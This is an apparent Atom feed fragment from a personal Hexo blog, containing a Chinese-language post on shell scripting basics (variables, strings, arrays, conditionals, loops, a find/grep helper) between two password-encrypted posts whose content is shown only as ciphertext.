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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="unicorn" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/unicorn/"/>
    
  </entry>
  
  <entry>
    <title>shellscript总结</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/17/shellscript/shellscript/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/17/shellscript/shellscript/</id>
    <published>2018-04-17T10:33:40.000Z</published>
    <updated>2019-04-19T11:32:58.508Z</updated>
    
    <content type="html"><![CDATA[<h3 id="shellscript总结"><a href="#shellscript总结" class="headerlink" title="shellscript总结"></a>shellscript总结</h3><h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><pre><code>name=&quot;zhang&quot;</code></pre><ul><li><p>变量名和等号之间不能有空格</p></li><li><p>英文，数字下划线，不能有空格，标点</p></li><li><p>不能以数字开头</p></li><li><p>不能是关键字</p></li></ul><h4 id="单引号-双引号"><a href="#单引号-双引号" class="headerlink" title="单引号/双引号"></a>单引号/双引号</h4><ul><li><p>单引号会原样输出</p></li><li><p>双引号里面可以有变量，转义字符</p></li></ul><h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><pre><code class="bash"># 拼接name=&#39;zhang&#39;helloname=&quot;hello, &quot;$name&quot;!&quot;helloname=&quot;hello, &quot;${name}&quot;!&quot;#获取长度echo ${#name}  # [out]:5#提取子字符串echo ${name:1:4} #[out]:hang</code></pre><h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><pre><code class="bash">my_array=(A B C D)echo &quot;数组的元素为: ${my_array[1]}&quot;echo &quot;数组的元素为: ${my_array[@]}&quot;#[out]:#数组的元素为: B#数组的元素为: A B C D</code></pre><h4 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h4><pre><code class="bash">#文件存在且为目录-d #文件存在且为一般文件-f#文件存在且为链接文件-L</code></pre><h4 id="if"><a href="#if" class="headerlink" title="if"></a>if</h4><pre><code class="bash">a=10b=20if [ $a == $b ];then    echo &quot;a 等于 b&quot;elif [ $a -gt $b ];then    echo &quot;a 大于 b&quot;elif [ $a -lt $b ];then    echo &quot;a 小于 b&quot;else    echo &quot;没有符合的条件&quot;fi    # [out]:a 等于 b</code></pre><h4 id="for"><a href="#for" class="headerlink" title="for"></a>for</h4><pre><code class="bash"># for infor loop in 1 2 3 4 5;do    echo &quot;The value is: $loop&quot;done# [out]:The value is: 1 The value is: 2 The value is: 3 The value is: 4 The value is: 5</code></pre><h4 id="xfind"><a href="#xfind" class="headerlink" title="xfind"></a>xfind</h4><pre><code class="shell">function xfind(){    find $1 -type f -regex &quot;.*&quot; -print0 | xargs -0  grep -i $2}if [ -z &quot;$1&quot; -o -z &quot;$2&quot; ]; then    echo &quot;[usage] xfind path_of_dir key_words_you_want_to_search&quot;else    xfind $1 $2fi</code></pre><h4 id="xargs"><a href="#xargs" class="headerlink" title="xargs"></a>xargs</h4><pre><code>管道是标准输出到标准输入，但并不是所有命令都是从标准输入中取参数，所以需要xargs命令。使其从标准输出到命令参数</code></pre><p>更多细节点<a href="https://www.cnblogs.com/wangqiguo/p/6464234.html" target="_blank" rel="external">这里</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;shellscript总结&quot;&gt;&lt;a href=&quot;#shellscript总结&quot; class=&quot;headerlink&quot; title=&quot;shellscript总结&quot;&gt;&lt;/a&gt;shellscript总结&lt;/h3&gt;&lt;h4 id=&quot;变量&quot;&gt;&lt;a href=&quot;#变量&quot; cla
      
    
    </summary>
    
      <category term="misc" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/misc/"/>
    
    
      <category term="shell" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/shell/"/>
    
  </entry>
  
  <entry>
    <title>正则表达式</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/08/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/08/正则表达式/正则表达式/</id>
    <published>2018-04-08T08:32:33.000Z</published>
    <updated>2019-04-19T11:31:33.949Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">U2FsdGVkX1+ol0SkY0KBGe4tBZrFIhjHvaeh72ESpUug1QSZzoToREar2+Tlo6hvTahMN053PIHdww9cjPa2jyuV0I/BnOx1G/lVFS14TKIpW9loplLzL91eGwogKGK6LmmflOzqbOEiGViGO6tsaLjvx2WuuxCH298kbbq1xdJ0aEGwZU+FQe5iwfHUUewTNxlLOYQZ0330Nj2v+Y6MErWoqP/F2aZ/m0M9De4iCMxcEG9utXbXuUk0PxOc3zrR4ExNnM9hFRtrH+ZT3mX448ho2kV+zuRJbzidAOg+BQeULym08gmYPH5WnABTJicoGMqGK9b2XfjkOmJALteQ5i9teAoN6l6GzrxTbIyO0guAgHJaQUEiRC3q5865us6GnPBXKKtoyyP2yDlNQH7QejzQLM8ImqB0ubYPKlrL6xZgTyVbKAKTMFLTPnJ1PctqRvv2PHf2MG/GocfJmJlO231xe9pmYgZ12kDXDel3vJVfO2SWsBp+Bkb984tpJvOczEEaoYCM+k7fcRT17h1YWHSBiYC38NjGbYTq2NKyWGBFzaRliPeZPCXODuQWTD36KnMeVwMi5HXfn0yvLAfw8+JJ33O/a1AA2OvXTVbZChQfOiKz6u+yahzjDLVooTQ49MIj/+AWS0D6n8ILe2l15ougi